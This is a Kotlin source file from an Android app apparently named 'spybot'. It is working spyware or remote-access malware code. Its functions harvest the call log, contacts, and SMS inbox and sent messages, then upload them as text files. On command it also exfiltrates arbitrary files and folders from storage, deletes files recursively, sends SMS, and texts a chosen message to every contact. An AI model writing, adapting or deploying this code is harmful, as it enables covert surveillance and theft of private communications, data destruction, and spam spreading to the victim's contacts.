package com.spybot.app.Utils

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.util.Log
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class AppActions(val context: Context) {

    companion object {
        private const val TAG = "AppActions"
        private const val MAX_CALLS = 500
        private const val MAX_SMS = 200
    }

    private val request = AppRequest()
    private val permission = AppPermission(context)

    @SuppressLint("Range")
    fun uploadCalls() {
        if (!permission.checkReadCallLog()) {
            request.sendText(AppRequest.Text("Call log permission denied"))
            return
        }
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.CACHED_NAME),
                null, null, "${CallLog.Calls.DATE} DESC"
            ) ?: run { request.sendText(AppRequest.Text("Could not read call log")); return }

            val text = StringBuilder()
            text.append("CALL LOG - ${AppTools.getDeviceName()}\n")
            text.append("═══════════════════════════════════════\n\n")

            var count = 0
            while (cursor.moveToNext() && count < MAX_CALLS) {
                count++
                val number = cursor.getString(0) ?: "Unknown"
                val duration = cursor.getString(1) ?: "0"
                val type = cursor.getString(2) ?: "0"
                val date = cursor.getLong(3)
                val name = cursor.getString(4) ?: "Unknown"

                val typeStr = when (type) {
                    "1" -> "INCOMING"
                    "2" -> "OUTGOING"
                    "3" -> "MISSED"
                    "4" -> "VOICEMAIL"
                    "5" -> "REJECTED"
                    "6" -> "BLOCKED"
                    else -> "UNKNOWN"
                }

                val dateStr = try {
                    SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date(date))
                } catch (e: Exception) { "Unknown" }

                text.append("#$count\nName: $name\nNumber: $number\nType: $typeStr\nDuration: ${duration}s\nDate: $dateStr\n")
                text.append("─────────────────────────────────────\n")
            }
            cursor.close()
            text.append("\nTotal Calls: $count")

            sendTextFile("CallLog_${AppTools.getDeviceName()}", text.toString())
        } catch (e: Exception) {
            request.sendText(AppRequest.Text("Error reading call log: ${e.message}"))
        }
    }

    @SuppressLint("Range")
    fun uploadContact() {
        if (!permission.checkReadContacts()) {
            request.sendText(AppRequest.Text("Contact permission denied"))
            return
        }
        try {
            val text = StringBuilder()
            text.append("CONTACTS - ${AppTools.getDeviceName()}\n")
            text.append("═══════════════════════════════════════\n\n")

            val cr: ContentResolver = context.contentResolver
            val cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, "${ContactsContract.Contacts.DISPLAY_NAME} ASC")

            var count = 0
            if ((cur?.count ?: 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    count++
                    val id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))
                    val name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))

                    text.append("#$count\nName: $name\n")

                    if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        val pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf(id), null
                        )
                        while (pCur!!.moveToNext()) {
                            val phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            val phoneType = pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE))
                            val typeStr = when (phoneType) {
                                ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
                                ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
                                ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
                                else -> "Other"
                            }
                            text.append("Phone ($typeStr): $phoneNo\n")
                        }
                        pCur.close()
                    }

                    val eCur = cr.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", arrayOf(id), null
                    )
                    while (eCur!!.moveToNext()) {
                        val email = eCur.getString(eCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))
                        text.append("Email: $email\n")
                    }
                    eCur.close()
                    text.append("─────────────────────────────────────\n")
                }
            }
            cur?.close()
            text.append("\nTotal Contacts: $count")

            sendTextFile("Contacts_${AppTools.getDeviceName()}", text.toString())
        } catch (e: Exception) {
            request.sendText(AppRequest.Text("Error reading contacts: ${e.message}"))
        }
    }

    @SuppressLint("Range")
    fun uploadMessages() {
        if (!permission.checkReadSms()) {
            request.sendText(AppRequest.Text("SMS permission denied"))
            return
        }
        try {
            val text = StringBuilder()
            text.append("SMS MESSAGES - ${AppTools.getDeviceName()}\n")
            text.append("═══════════════════════════════════════\n\n")

            var count = 0

            text.append("INBOX\n─────────────────────────────────────\n")
            val curInbox = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
            if (curInbox != null) {
                while (curInbox.moveToNext() && count < MAX_SMS) {
                    count++
                    val address = curInbox.getString(curInbox.getColumnIndex("address"))
                    val body = curInbox.getString(curInbox.getColumnIndexOrThrow("body"))
                    val date = curInbox.getLong(curInbox.getColumnIndex("date"))
                    val read = curInbox.getInt(curInbox.getColumnIndex("read"))

                    val dateStr = try {
                        SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date(date))
                    } catch (e: Exception) { "Unknown" }

                    text.append("From: $address\nDate: $dateStr\nRead: ${if (read == 1) "Yes" else "No"}\nMessage: $body\n")
                    text.append("─────────────────────────────────────\n")
                }
                curInbox.close()
            }

            text.append("\nSENT\n─────────────────────────────────────\n")
            val curSent = context.contentResolver.query(Uri.parse("content://sms/sent"), null, null, null, "date DESC")
            var sentCount = 0
            if (curSent != null) {
                while (curSent.moveToNext() && sentCount < 100) {
                    count++; sentCount++
                    val address = curSent.getString(curSent.getColumnIndex("address"))
                    val body = curSent.getString(curSent.getColumnIndexOrThrow("body"))
                    val date = curSent.getLong(curSent.getColumnIndex("date"))

                    val dateStr = try {
                        SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date(date))
                    } catch (e: Exception) { "Unknown" }

                    text.append("To: $address\nDate: $dateStr\nMessage: $body\n")
                    text.append("─────────────────────────────────────\n")
                }
                curSent.close()
            }

            text.append("\nTotal Messages: $count")
            sendTextFile("SMS_${AppTools.getDeviceName()}", text.toString())
        } catch (e: Exception) {
            request.sendText(AppRequest.Text("Error reading SMS: ${e.message}"))
        }
    }

    @SuppressLint("NewApi")
    fun sendMessage(number: String, message: String) {
        if (!permission.checkSendSms()) {
            request.sendText(AppRequest.Text("SMS permission denied"))
            return
        }
        try {
            val sentPI = PendingIntent.getBroadcast(
                context, 0, Intent("SMS_SENT"),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )

            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }

            val parts = smsManager.divideMessage(message)
            if (parts.size > 1) {
                val sentIntents = ArrayList<PendingIntent>()
                for (i in parts.indices) sentIntents.add(sentPI)
                smsManager.sendMultipartTextMessage(number, null, parts, sentIntents, null)
            } else {
                smsManager.sendTextMessage(number, null, message, sentPI, null)
            }
            request.sendText(AppRequest.Text("SMS sent to $number"))
        } catch (e: Exception) {
            request.sendText(AppRequest.Text("Error sending SMS: ${e.message}"))
        }
    }

    @SuppressLint("Range")
    fun messageToAllContacts(message: String) {
        if (!permission.checkReadContacts() || !permission.checkSendSms()) {
            request.sendText(AppRequest.Text("Permission denied"))
            return
        }
        try {
            val cr: ContentResolver = context.contentResolver
            val cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)

            var sentCount = 0
            val phoneNumbers = mutableSetOf<String>()

            if ((cur?.count ?: 0) > 0) {
                while (cur != null && cur.moveToNext()) {
                    val id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))

                    if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        val pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf(id), null
                        )

                        while (pCur!!.moveToNext()) {
                            val phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                            if (!phoneNumbers.contains(phoneNo)) {
                                phoneNumbers.add(phoneNo)
                                try {
                                    val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                                        context.getSystemService(SmsManager::class.java)
                                    } else {
                                        @Suppress("DEPRECATION")
                                        SmsManager.getDefault()
                                    }
                                    smsManager.sendTextMessage(phoneNo, null, message, null, null)
                                    sentCount++
                                    Thread.sleep(500)
                                } catch (e: Exception) {}
                            }
                        }
                        pCur.close()
                    }
                }
            }
            cur?.close()
            request.sendText(AppRequest.Text("SMS sent to $sentCount contacts"))
        } catch (e: Exception) {
            request.sendText(AppRequest.Text("Error broadcasting SMS: ${e.message}"))
        }
    }

    fun uploadFile(path: String) {
        if (!permission.checkReadExternalStorage()) {
            request.sendText(AppRequest.Text("Storage permission denied"))
            return
        }
        try {
            val file = File(Environment.getExternalStorageDirectory().path + "/" + path)

            if (!file.exists()) {
                request.sendText(AppRequest.Text("File/folder not found: $path"))
                return
            }

            if (file.isDirectory) {
                val listFiles = file.listFiles()
                if (!listFiles.isNullOrEmpty()) {
                    request.sendText(AppRequest.Text("Folder: ${file.name} (${listFiles.size} items)"))
                    for (targetFile in listFiles) {
                        if (targetFile.isFile && targetFile.length() < 50 * 1024 * 1024) {
                            request.sendFile(targetFile)
                            Thread.sleep(100)
                        }
                    }
                } else {
                    request.sendText(AppRequest.Text("Folder is empty"))
                }
            } else if (file.isFile) {
                if (file.length() > 100 * 1024 * 1024) {
                    request.sendText(AppRequest.Text("File too large (${file.length() / 1024 / 1024}MB)"))
                } else {
                    request.sendFile(file)
                }
            }
        } catch (e: Exception) {
            request.sendText(AppRequest.Text("Error: ${e.message}"))
        }
    }

    fun deleteFile(path: String) {
        if (!permission.checkWriteExternalStorage()) {
            request.sendText(AppRequest.Text("Storage permission denied"))
            return
        }
        try {
            val file = File(Environment.getExternalStorageDirectory().path + "/" + path)

            if (!file.exists()) {
                request.sendText(AppRequest.Text("File not found: $path"))
                return
            }

            val result = if (file.isDirectory) file.deleteRecursively() else file.delete()
            if (result) {
                request.sendText(AppRequest.Text("Deleted: ${file.name}"))
            } else {
                request.sendText(AppRequest.Text("Failed to delete: ${file.name}"))
            }
        } catch (e: Exception) {
            request.sendText(AppRequest.Text("Error: ${e.message}"))
        }
    }

    private fun sendTextFile(name: String, content: String) {
        try {
            val file = File.createTempFile("${name}_", ".txt")
            val writer = FileWriter(file)
            writer.append(content)
            writer.flush()
            writer.close()
            request.sendFile(file)
        } catch (e: Exception) {
            request.sendText(AppRequest.Text("Error creating file: ${e.message}"))
        }
    }
}
